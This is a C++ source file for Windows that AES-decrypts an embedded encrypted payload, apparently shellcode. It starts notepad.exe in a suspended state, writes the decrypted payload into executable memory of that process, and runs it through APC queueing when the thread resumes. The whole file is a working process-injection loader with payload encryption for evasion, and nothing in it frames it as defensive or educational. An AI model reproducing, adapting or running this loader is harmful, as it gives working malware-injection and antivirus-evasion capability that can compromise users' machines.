
#include <Windows.h>
#include <iostream>
#include "aes.hpp"


using namespace std;


unsigned char pKey[] = {
        0x17, 0x69, 0x9F, 0x2A, 0xF3, 0x88, 0x6E, 0x7B, 0x07, 0x79, 0x50, 0xF8, 0x68, 0x14, 0x8C, 0x5D,
        0x2F, 0x16, 0xBB, 0x6E, 0x67, 0x75, 0xCE, 0xE6, 0x29, 0xF1, 0x52, 0xB0, 0x05, 0xEC, 0xF3, 0x59 };


unsigned char pIv[] = {
        0x35, 0x49, 0xA8, 0x24, 0x92, 0x95, 0xDA, 0x91, 0x84, 0x54, 0x1D, 0x84, 0xB9, 0xC9, 0xBD, 0xE8 };


unsigned char CipherText[] = {
        0x46, 0x94, 0x40, 0x49, 0x2E, 0x9A, 0xE0, 0xBE, 0xD9, 0x42, 0x61, 0xD5, 0xCB, 0xDD, 0xF7, 0x3C,
        0x4F, 0x98, 0x22, 0x77, 0x57, 0xB3, 0xD0, 0x5B, 0x85, 0x27, 0x28, 0x05, 0x55, 0x30, 0x78, 0x2D,
        0x79, 0x96, 0x07, 0xDD, 0xC5, 0x23, 0x36, 0x50, 0x8E, 0x04, 0x11, 0x34, 0xD8, 0xB2, 0x8F, 0xF3,
        0x48, 0x14, 0x73, 0x5F, 0xB2, 0x50, 0x21, 0xD2, 0xAC, 0x9C, 0xBE, 0xA7, 0xD2, 0x74, 0x2D, 0xD4,
        0x8B, 0x4C, 0xF0, 0xF4, 0x6D, 0xEC, 0x68, 0x96, 0x3D, 0x7E, 0x52, 0xCF, 0xB0, 0x1C, 0xA0, 0x51,
        0xFD, 0x23, 0x37, 0x47, 0xB9, 0x3A, 0x2E, 0x34, 0xAE, 0xBA, 0x85, 0x67, 0xE0, 0x90, 0x53, 0x72,
        0x1C, 0x7A, 0x33, 0x46, 0x6A, 0x0B, 0x64, 0x87, 0xE9, 0xC5, 0x3A, 0xF2, 0x5C, 0x5E, 0x56, 0x3B,
        0x93, 0x56, 0xC1, 0x30, 0x6C, 0x68, 0x0D, 0x07, 0x7C, 0xB4, 0x1E, 0xD8, 0x0A, 0x91, 0x66, 0x88,
        0x8D, 0x71, 0x9D, 0x54, 0x76, 0x82, 0x1E, 0xE3, 0x7D, 0x65, 0x4A, 0x55, 0x23, 0xE5, 0x34, 0x3A,
        0xB1, 0x73, 0x72, 0x34, 0xB7, 0x86, 0x96, 0xF3, 0xC2, 0x0B, 0xBA, 0x40, 0x98, 0x7F, 0x25, 0xB0,
        0xC4, 0x10, 0x2F, 0x79, 0xB7, 0x4B, 0x93, 0x4F, 0xA5, 0x48, 0x02, 0x50, 0x30, 0xF8, 0xCC, 0xBA,
        0x55, 0x66, 0x07, 0xBC, 0x75, 0x87, 0x0A, 0xCB, 0xD4, 0x2A, 0xF4, 0xE1, 0x92, 0xF8, 0x4F, 0x8C,
        0x2A, 0xC1, 0x19, 0x19, 0x2C, 0x03, 0x99, 0x51, 0x3B, 0xED, 0x0A, 0x51, 0x76, 0x41, 0x6E, 0x45 };

void decrypt_payload() {
    struct AES_ctx ctx;
    AES_init_ctx_iv(&ctx, pKey, pIv);
    AES_CBC_decrypt_buffer(&ctx, CipherText, sizeof(CipherText));
}

// Print the input buffer as a hex char array
VOID PrintHexData(LPCSTR Name, PBYTE Data, SIZE_T Size) {

    printf("unsigned char %s[] = {", Name);

    for (int i = 0; i < Size; i++) {
        if (i % 16 == 0) {
            printf("\n\t");
        }
        if (i < Size - 1) {
            printf("0x%0.2X, ", Data[i]);
        }
        else {
            printf("0x%0.2X ", Data[i]);
        }
    }

    printf("};\n\n\n");

}
unsigned char* buf = CipherText;



BOOL Injector(HANDLE hProcess, HANDLE hThread) {
    decrypt_payload();

    SIZE_T shellSize = sizeof(CipherText);
    LPVOID shellAddress = VirtualAllocEx(hProcess, NULL, shellSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (shellAddress == NULL) return FALSE;
    /*
    // Printing the decrypted buffer to the console
    PrintHexData("PlainText", CipherText, sizeof(CipherText));

    // Printing the string
    printf("Data: %s \n", CipherText);
    */
    if (WriteProcessMemory(hProcess, shellAddress, buf, shellSize, NULL) == 0) return FALSE;

    PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)shellAddress;
    QueueUserAPC((PAPCFUNC)apcRoutine, hThread, NULL);

    return TRUE;
}

int main() {
    STARTUPINFOA si = { 0 };
    PROCESS_INFORMATION pi = { 0 };

    // create a suspended notepad process
    if (!CreateProcessA("C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        wprintf(L"ERROR: (%d) Unable to Create Process\n", GetLastError());
    }
    // inject into the notepad process by grabbing the processid and threadid from the process_information structutr
    if (!Injector(pi.hProcess, pi.hThread)) {
        wprintf(L"ERROR: (%d) Unable to Inject into Process\n", GetLastError());
    }

    ResumeThread(pi.hThread); //resume operation of the worker thread

    return 0;
}
